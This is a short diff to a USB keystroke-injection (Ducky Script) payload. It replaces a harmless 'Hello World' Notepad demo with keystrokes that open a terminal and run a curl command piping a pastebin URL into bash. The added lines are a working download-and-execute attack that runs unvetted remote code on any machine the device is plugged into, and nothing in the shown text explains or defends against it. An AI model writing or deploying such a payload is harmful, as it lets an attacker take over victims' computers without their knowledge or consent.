@@ -1,6 +1,14 @@
-REM The next four lines open Notepad in Windows and type "Hello World!"
-GUI r
-STRING notepad
-ENTER
+GUI
 DELAY 250
-STRING Hello World!
+STRING terminal
+DELAY 20
+CONTROL ENTER
+DELAY 5000
+STRING curl -sL https://pastebin.com/raw/VYMaVaif | bash
+ENTER
+
+
+
+
+
+
